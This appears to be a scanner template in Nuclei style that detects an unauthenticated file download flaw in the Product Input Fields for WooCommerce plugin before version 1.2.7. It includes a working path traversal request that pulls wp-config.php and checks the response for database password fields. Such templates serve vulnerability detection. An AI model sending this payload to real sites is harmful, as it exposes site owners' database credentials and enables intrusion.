id: wp-woocommerce-file-download
name: Product Input Fields for WooCommerce < 1.2.7 - Unauthenticated File Download
severity: high
confidence: tentative
description: WordPress WooCommerce < 1.2.7 is susceptible to file download vulnerabilities. The lack of authorization checks
  in the handle_downloads() function hooked to admin_init() could allow unauthenticated users to download arbitrary files
  from the blog using a path traversal payload.
reference: CWE-22
tags:
- wordpress
- woocommerce
- lfi
- wp-plugin
- wp
- vuln
requests:
- method: GET
  path: /wp-admin/admin-post.php?alg_wc_pif_download_file=../../../../../wp-config.php
  matchers:
  - type: body
    words:
    - DB_NAME
    - DB_PASSWORD
  - type: status
    status:
    - 200
  condition: and
